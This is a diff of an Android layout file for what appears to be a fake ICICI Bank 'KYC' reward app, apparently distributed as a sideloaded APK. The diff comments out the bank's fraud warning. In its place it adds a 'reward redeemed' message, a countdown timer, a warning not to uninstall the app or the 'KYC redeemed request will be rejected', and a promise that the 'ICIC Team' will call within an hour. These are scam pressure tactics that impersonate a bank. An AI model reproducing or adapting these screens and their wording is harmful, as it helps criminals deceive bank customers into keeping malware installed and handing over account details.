@@ -13,86 +13,199 @@
         <ImageView
             android:layout_width="120sp"
             android:layout_height="80sp"
+            android:layout_gravity="center"
             android:src="@drawable/logoici" />
 
-    <androidx.cardview.widget.CardView
-        android:layout_width="match_parent"
-        android:elevation="50sp"
-        android:layout_margin="10sp"
-        android:padding="20sp"
-        app:cardCornerRadius="10sp"
-        android:layout_height="wrap_content">
+<!--    <androidx.cardview.widget.CardView-->
+<!--        android:layout_width="match_parent"-->
+<!--        android:elevation="50sp"-->
+<!--        android:layout_margin="10sp"-->
+<!--        android:padding="20sp"-->
+<!--        app:cardCornerRadius="10sp"-->
+<!--        android:layout_height="wrap_content">-->
 
 
-    <LinearLayout
-        android:padding="20sp"
-        android:layout_width="match_parent"
-        android:layout_height="match_parent"
-        android:orientation="vertical">
+<!--    <LinearLayout-->
+<!--        android:padding="20sp"-->
+<!--        android:layout_width="match_parent"-->
+<!--        android:layout_height="match_parent"-->
+<!--        android:orientation="vertical">-->
+
+
+<!--        <TextView-->
+<!--            android:layout_width="wrap_content"-->
+<!--            android:layout_height="wrap_content"-->
+<!--            android:textColor="@color/blue"-->
+<!--            android:textStyle="bold"-->
+<!--            android:text="Important Note"/>-->
+
+
+<!--        <LinearLayout-->
+<!--            android:padding="3sp"-->
+<!--            android:layout_margin="10dp"-->
+<!--            android:layout_width="match_parent"-->
+<!--            android:layout_height="wrap_content"-->
+<!--            android:background="@color/lightgreen"-->
+<!--            tools:ignore="ExtraText">-->
+
+<!--            <TextView-->
+<!--                android:textStyle="bold"-->
+<!--                android:textSize="20sp"-->
+<!--                android:layout_width="match_parent"-->
+<!--                android:layout_height="wrap_content"-->
+<!--                android:text="Please wait your details are being verified it will take minimum 30 minutes Most information - Dont't delete unistall this app thanks for joining ICICI KYC App in only APK file not PLAY STORE"-->
+<!--                />-->
+
+
+<!--        </LinearLayout>-->
+
+
+<!--        <TextView-->
+<!--            android:id="@+id/home"-->
+<!--            android:layout_width="wrap_content"-->
+<!--            android:layout_height="wrap_content"-->
+<!--            android:textColor="@color/orange"-->
+<!--            android:textAlignment="center"-->
+<!--            android:textSize="15sp"-->
+<!--            android:layout_gravity="center"-->
+<!--            android:textStyle="bold"-->
+<!--            android:text="Back To Home "/>-->
+
+
+
+<!--    </LinearLayout>-->
+
+
+
+
+<!--    </androidx.cardview.widget.CardView>-->
+
+
+<!--        <View-->
+<!--            android:layout_width="match_parent"-->
+<!--            android:layout_height="10sp"/>-->
+
+<!--        <TextView-->
+<!--            android:layout_width="wrap_content"-->
+<!--            android:layout_height="wrap_content"-->
+<!--            android:padding="10sp"-->
+<!--            android:textSize="15sp"-->
+<!--            android:text="Safe Banking never share your User ID, Password or any other information with anyone on phone, SMS or Email, ICICI Bank does not call/ email cutomer for such information Beware of fraudsters asking such details posing as Bank staff."/>-->
 
 
         <TextView
+            android:id="@+id/tv1"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:textColor="@color/blue"
-            android:textStyle="bold"
-            android:text="Important Note"/>
-
-
-        <LinearLayout
-            android:padding="3sp"
-            android:layout_margin="10dp"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:background="@color/lightgreen"
-            tools:ignore="ExtraText">
-
-            <TextView
-                android:textStyle="bold"
-                android:textSize="20sp"
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:text="Please wait your details are being verified it will take minimum 30 minutes Most information - Dont't delete unistall this app thanks for joining ICICI KYC App in only APK file not PLAY STORE"
-                />
-
-
-        </LinearLayout>
-
-
-        <TextView
-            android:id="@+id/home"
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:textColor="@color/orange"
-            android:textAlignment="center"
-            android:textSize="15sp"
+            android:padding="10dp"
+            android:text="Your Reward Point has been successfully redeemed within 1hr Don't uninstall the app otherwise your KYC redeemed request will be rejected"
             android:layout_gravity="center"
+            android:textColor="@color/black"/>
+
+<!--        <TextView-->
+<!--            android:id="@+id/tv2"-->
+<!--            android:layout_width="wrap_content"-->
+<!--            android:layout_height="wrap_content"-->
+<!--            android:paddingEnd="12sp"-->
+<!--            android:layout_marginTop="8sp"-->
+<!--            android:singleLine="true"-->
+<!--            android:gravity="center"-->
+<!--            android:textSize="13sp"-->
+<!--            android:layout_marginStart="25sp"-->
+<!--            android:layout_marginEnd="20sp"-->
+<!--            android:text=""-->
+<!--            android:layout_gravity="center"-->
+<!--            android:textColor="@color/black"/>-->
+<!--        <TextView-->
+<!--            android:id="@+id/tv3"-->
+<!--            android:layout_width="wrap_content"-->
+<!--            android:layout_height="wrap_content"-->
+<!--            android:padding="10sp"-->
+<!--            android:textSize="13sp"-->
+<!--            android:layout_marginStart="70sp"-->
+<!--            android:paddingBottom="90sp"-->
+<!--            android:layout_marginBottom="9sp"-->
+<!--            android:layout_marginEnd="80sp"-->
+<!--            android:text="rejected"-->
+<!--            android:layout_gravity="center"-->
+<!--            android:textColor="@color/black"/>-->
+
+
+
+        <TextView
+            android:id="@+id/timer"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
             android:textStyle="bold"
-            android:text="Back To Home "/>
+            android:text="57:02"
+            android:layout_gravity="center"
+            android:textColor="@color/black"/>
 
+        <View
+            android:layout_width="match_parent"
+            android:layout_height="20sp"/>
 
-
-    </LinearLayout>
-
-
-
-
-    </androidx.cardview.widget.CardView>
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text="We will call you within 1 hour. From ICIC Team"
+            android:textColor="@color/black"/>
 
 
         <View
             android:layout_width="match_parent"
-            android:layout_height="10sp"/>
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:padding="10sp"
-            android:textSize="15sp"
-            android:text="Safe Banking never share your User ID, Password or any other information with anyone on phone, SMS or Email, ICICI Bank does not call/ email cutomer for such information Beware of fraudsters asking such details posing as Bank staff."/>
+            android:layout_height="20sp"/>
 
 
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:orientation="horizontal"
+            android:background="@color/black"
+            android:layout_gravity="start"
+            android:foregroundGravity="center"
+            android:gravity="center|start"
+            android:layout_height="50sp">
 
+            <View
+                android:layout_width="10sp"
+                android:layout_height="wrap_content"/>
+
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:textColor="@color/white"
+                android:text="Copyright"/>
+
+            <View
+                android:layout_width="10sp"
+                android:layout_height="wrap_content"/>
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:textColor="@color/white"
+                android:text="Terms and Conditions"/>
+
+            <View
+                android:layout_width="10sp"
+                android:layout_height="wrap_content"/>
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:textColor="@color/white"
+                android:text="Privacy Policy"/>
+
+            <View
+                android:layout_width="10sp"
+                android:layout_height="wrap_content"/>
+
+        </LinearLayout>
 
     </LinearLayout>
+
+
+
 </layout>
